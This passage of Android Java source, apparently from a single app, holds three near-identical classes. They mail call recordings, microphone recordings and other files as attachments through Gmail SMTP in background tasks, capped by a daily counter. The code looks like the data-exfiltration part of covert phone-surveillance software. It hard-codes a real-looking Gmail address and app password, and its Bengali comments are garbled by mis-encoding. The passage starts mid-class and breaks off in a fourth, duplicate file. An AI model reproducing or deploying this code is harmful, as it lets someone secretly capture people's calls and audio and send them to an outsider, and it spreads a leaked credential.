        this.email = email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦² à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.subject = subject; // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.message = message; // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.filePath = filePath; // à¦«à¦¾à¦‡à¦² à¦ªà¦¾à¦¥ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
    }

    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡
    public void sendMail() {
        new SendMailTask().execute(); // AsyncTask à¦¶à§à¦°à§
    }

    private class SendMailTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            try {
                // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                if (!CountEmail.canSendEmail()) {
                    Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
                    return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
                }

                // SMTP à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
                Properties props = new Properties();
                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
                props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
                props.put("mail.smtp.auth", "true"); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                props.put("mail.smtp.starttls.enable", "true"); // TLS à¦¸à¦•à§à¦°à¦¿à§Ÿ à¦•à¦°à¦¾

                final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
                final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡

                // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                Session session = Session.getInstance(props, new Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                    }
                });

                // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                MimeMessage mimeMessage = new MimeMessage(session);
                mimeMessage.setFrom(new InternetAddress(username)); // à¦ªà§à¦°à§‡à¦°à¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // à¦ªà§à¦°à¦¾à¦ªà¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                mimeMessage.setSubject(subject); // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

                // à¦®à§‡à¦¸à§‡à¦œ à¦à¦¬à¦‚ à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                Multipart multipart = new MimeMultipart();
                MimeBodyPart messageBodyPart = new MimeBodyPart();
                messageBodyPart.setText(message); // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                multipart.addBodyPart(messageBodyPart); // à¦®à§‡à¦¸à§‡à¦œ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾

                // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ (à¦¯à¦¦à¦¿ à¦¥à¦¾à¦•à§‡)
                if (filePath != null && !filePath.isEmpty()) {
                    try {
                        MimeBodyPart attachmentPart = new MimeBodyPart();
                        DataSource source = new FileDataSource(filePath); // à¦«à¦¾à¦‡à¦² à¦¸à§‹à¦°à§à¦¸
                        attachmentPart.setDataHandler(new DataHandler(source)); // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
                        attachmentPart.setFileName(new File(filePath).getName()); // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦®
                        multipart.addBodyPart(attachmentPart); // à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                    } catch (Exception e) {
                        Log.e(TAG, "Error attaching file: " + e.getMessage()); // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                        e.printStackTrace();
                    }
                }

                mimeMessage.setContent(multipart); // à¦®à§‡à¦‡à¦² à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

                // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                Transport.send(mimeMessage);
                CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
                Log.d(TAG, "Callrecord Email sent successfully with attachment."); // à¦¸à¦«à¦² à¦²à¦—
            } catch (MessagingException e) {
                Log.e(TAG, "Callrecord Error occurred while sending email: " + e.getMessage()); // à¦®à§‡à¦¸à§‡à¦œà¦¿à¦‚ à¦¤à§à¦°à§à¦Ÿà¦¿
                e.printStackTrace();
            } catch (Exception e) {
                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // à¦…à¦¨à§à¦¯ à¦¤à§à¦°à§à¦Ÿà¦¿
                e.printStackTrace();
            }
            return null; // à¦¸à¦®à§à¦ªà¦¨à§à¦¨
        }
    }

    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡ à¦¯à¦¾ à¦…à¦¨à§à¦¯ à¦œà¦¾à§Ÿà¦—à¦¾ à¦¥à§‡à¦•à§‡ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡
    public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
        try {
            JavaMailAPI_CallRecord_Sender javaMailAPI = new JavaMailAPI_CallRecord_Sender(email, subject, message, filePath);
            javaMailAPI.sendMail(); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡ à¦•à¦² à¦•à¦°à¦¾
        } catch (Exception e) {
            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡à§‡ à¦¤à§à¦°à§à¦Ÿà¦¿
            e.printStackTrace();
        }
    }
}



//JavaMailAPI_Fileservice_Sender.java
package com.example.fasterpro11;

import android.os.AsyncTask; // AsyncTask à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°
import android.util.Log; // à¦²à¦— à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯

import java.io.File; // à¦«à¦¾à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
import java.util.Properties; // à¦ªà§à¦°à¦ªà¦¾à¦°à§à¦Ÿà¦¿ à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
import javax.mail.*; // à¦®à§‡à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
import javax.mail.internet.*; // à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦®à§‡à¦‡à¦²
import javax.activation.*; // à¦…à§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦­à§‡à¦¶à¦¨

public class JavaMailAPI_Fileservice_Sender {
    private static final String TAG = "JavaMailAPI"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
    private String email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦²
    private String subject; // à¦‡à¦®à§‡à¦‡à¦² à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ
    private String message; // à¦‡à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ
    private String filePath; // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦ªà¦¾à¦¥

    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à§à¦Ÿà¦°
    public JavaMailAPI_Fileservice_Sender(String email, String subject, String message, String filePath) {
        this.email = email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦² à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.subject = subject; // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.message = message; // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.filePath = filePath; // à¦«à¦¾à¦‡à¦² à¦ªà¦¾à¦¥ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        Log.d(TAG, "JavaMailAPI_Fileservice_Sender initialized with email: " + email); // à¦‡à¦¨à¦¿à¦¶à¦¿à§Ÿà¦¾à¦²à¦¾à¦‡à¦œà§‡à¦¶à¦¨ à¦²à¦—
    }

    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡
    public void sendMail() {
        new SendMailTask().execute(); // AsyncTask à¦¶à§à¦°à§
    }

    private class SendMailTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            try {
                // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                if (!CountEmail.canSendEmail()) {
                    Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
                    return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
                }

                // SMTP à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
                Properties props = new Properties();
                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
                props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
                props.put("mail.smtp.auth", "true"); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                props.put("mail.smtp.starttls.enable", "true"); // TLS à¦¸à¦•à§à¦°à¦¿à§Ÿ à¦•à¦°à¦¾
                Log.d(TAG, "File Service SMTP properties set."); // à¦²à¦—

                final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
                final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡

                // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                Session session = Session.getInstance(props, new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        Log.d(TAG, "File Service Authenticating user: " + username); // à¦²à¦—
                        return new PasswordAuthentication(username, password); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                    }
                });

                // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                MimeMessage mimeMessage = new MimeMessage(session);
                mimeMessage.setFrom(new InternetAddress(username)); // à¦ªà§à¦°à§‡à¦°à¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // à¦ªà§à¦°à¦¾à¦ªà¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                mimeMessage.setSubject(subject); // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

                // à¦®à§‡à¦¸à§‡à¦œ à¦à¦¬à¦‚ à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                Multipart multipart = new MimeMultipart();
                MimeBodyPart messageBodyPart = new MimeBodyPart();
                messageBodyPart.setText(message); // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                multipart.addBodyPart(messageBodyPart); // à¦®à§‡à¦¸à§‡à¦œ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾

                // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ (à¦¯à¦¦à¦¿ à¦¥à¦¾à¦•à§‡)
                if (filePath != null && !filePath.isEmpty()) {
                    try {
                        Log.d(TAG, "File Service Preparing to attach file: " + filePath); // à¦²à¦—
                        MimeBodyPart attachmentPart = new MimeBodyPart();
                        DataSource source = new FileDataSource(filePath); // à¦«à¦¾à¦‡à¦² à¦¸à§‹à¦°à§à¦¸
                        attachmentPart.setDataHandler(new DataHandler(source)); // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
                        attachmentPart.setFileName(new File(filePath).getName()); // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦®
                        multipart.addBodyPart(attachmentPart); // à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                        Log.d(TAG, "File Service Attachment added: " + new File(filePath).getName()); // à¦²à¦—
                    } catch (Exception e) {
                        Log.e(TAG, "Error attaching file: " + e.getMessage()); // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                        e.printStackTrace();
                    }
                } else {
                    Log.d(TAG, "File Service No file to attach."); // à¦²à¦—
                }

                mimeMessage.setContent(multipart); // à¦®à§‡à¦‡à¦² à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

                // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                try {
                    Transport.send(mimeMessage); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                    CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
                    Log.d(TAG, "File Service Email sent successfully with attachment."); // à¦¸à¦«à¦² à¦²à¦—
                } catch (MessagingException e) {
                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage()); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿
                    e.printStackTrace();
                }
            } catch (Exception e) {
                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // à¦¯à§‡à¦•à§‹à¦¨à§‹ à¦…à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¿à¦¤ à¦¤à§à¦°à§à¦Ÿà¦¿
                e.printStackTrace();
            }

            return null; // à¦¸à¦®à§à¦ªà¦¨à§à¦¨
        }
    }

    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡ à¦¯à¦¾ à¦…à¦¨à§à¦¯ à¦œà¦¾à§Ÿà¦—à¦¾ à¦¥à§‡à¦•à§‡ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡
    public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
        try {
            Log.d(TAG, "File Service Sending mail with attachment to: " + email); // à¦²à¦—
            JavaMailAPI_Fileservice_Sender javaMailAPI = new JavaMailAPI_Fileservice_Sender(email, subject, message, filePath);
            javaMailAPI.sendMail(); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡ à¦•à¦² à¦•à¦°à¦¾
        } catch (Exception e) {
            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡à§‡ à¦¤à§à¦°à§à¦Ÿà¦¿
            e.printStackTrace();
        }
    }
}



//JavaMailAPI_MicRecord_Sender.java
package com.example.fasterpro11;

import android.os.AsyncTask; // AsyncTask à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°
import android.util.Log; // à¦²à¦— à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯

import java.io.File; // à¦«à¦¾à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
import java.util.Properties; // à¦ªà§à¦°à¦ªà¦¾à¦°à§à¦Ÿà¦¿ à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
import javax.mail.*; // à¦®à§‡à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
import javax.mail.internet.*; // à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦®à§‡à¦‡à¦²
import javax.activation.*; // à¦…à§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦­à§‡à¦¶à¦¨

public class JavaMailAPI_MicRecord_Sender {
    private static final String TAG = "JavaMailAPI"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
    private String email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦²
    private String subject; // à¦‡à¦®à§‡à¦‡à¦² à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ
    private String message; // à¦‡à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ
    private String filePath; // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦ªà¦¾à¦¥

    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à§à¦Ÿà¦°
    public JavaMailAPI_MicRecord_Sender(String email, String subject, String message, String filePath) {
        this.email = email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦² à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.subject = subject; // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.message = message; // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.filePath = filePath; // à¦«à¦¾à¦‡à¦² à¦ªà¦¾à¦¥ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
    }

    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡
    public void sendMail() {
        new SendMailTask().execute(); // AsyncTask à¦¶à§à¦°à§
    }

    private class SendMailTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            try {
                // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                if (!CountEmail.canSendEmail()) {
                    Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
                    return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
                }

                // SMTP à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
                Properties props = new Properties();
                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
                props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
                props.put("mail.smtp.auth", "true"); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                props.put("mail.smtp.starttls.enable", "true"); // TLS à¦¸à¦•à§à¦°à¦¿à§Ÿ à¦•à¦°à¦¾

                final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
                final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡

                // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                Session session = Session.getInstance(props, new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                    }
                });

                // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                MimeMessage mimeMessage = new MimeMessage(session);
                mimeMessage.setFrom(new InternetAddress(username)); // à¦ªà§à¦°à§‡à¦°à¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // à¦ªà§à¦°à¦¾à¦ªà¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                mimeMessage.setSubject(subject); // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

                // à¦®à§‡à¦¸à§‡à¦œ à¦à¦¬à¦‚ à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                Multipart multipart = new MimeMultipart();
                MimeBodyPart messageBodyPart = new MimeBodyPart();
                messageBodyPart.setText(message); // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                multipart.addBodyPart(messageBodyPart); // à¦®à§‡à¦¸à§‡à¦œ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾

                // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ (à¦¯à¦¦à¦¿ à¦¥à¦¾à¦•à§‡)
                if (filePath != null && !filePath.isEmpty()) {
                    try {
                        MimeBodyPart attachmentPart = new MimeBodyPart();
                        DataSource source = new FileDataSource(filePath); // à¦«à¦¾à¦‡à¦² à¦¸à§‹à¦°à§à¦¸
                        attachmentPart.setDataHandler(new DataHandler(source)); // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
                        attachmentPart.setFileName(new File(filePath).getName()); // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦®
                        multipart.addBodyPart(attachmentPart); // à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                    } catch (Exception e) {
                        Log.e(TAG, "Error occurred while attaching file: " + e.getMessage()); // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                        e.printStackTrace();
                    }
                }

                mimeMessage.setContent(multipart); // à¦®à§‡à¦‡à¦² à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

                // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                try {
                    Transport.send(mimeMessage); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                    CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
                    Log.d(TAG, "MicRecord Email sent successfully with attachment."); // à¦¸à¦«à¦² à¦²à¦—
                } catch (MessagingException e) {
                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage()); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                    e.printStackTrace();
                }
            } catch (Exception e) {
                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // à¦¯à§‡à¦•à§‹à¦¨à§‹ à¦…à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¿à¦¤ à¦¤à§à¦°à§à¦Ÿà¦¿
                e.printStackTrace();
            }
            return null; // à¦¸à¦®à§à¦ªà¦¨à§à¦¨
        }
    }

    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡ à¦¯à¦¾ à¦…à¦¨à§à¦¯ à¦œà¦¾à§Ÿà¦—à¦¾ à¦¥à§‡à¦•à§‡ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡
    public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
        try {
            JavaMailAPI_MicRecord_Sender javaMailAPI = new JavaMailAPI_MicRecord_Sender(email, subject, message, filePath);
            javaMailAPI.sendMail(); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡ à¦•à¦² à¦•à¦°à¦¾
        } catch (Exception e) {
            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡à§‡ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
            e.printStackTrace();
        }
    }
}



//JavaMailAPI_MicRecord_Sender .java
package com.example.fasterpro11;

import android.os.AsyncTask; // AsyncTask à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°
import android.util.Log; // à¦²à¦— à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯

import java.io.File; // à¦«à¦¾à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
import java.util.Properties; // à¦ªà§à¦°à¦ªà¦¾à¦°à§à¦Ÿà¦¿ à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
import javax.mail.*; // à¦®à§‡à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
import javax.mail.internet.*; // à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦®à§‡à¦‡à¦²
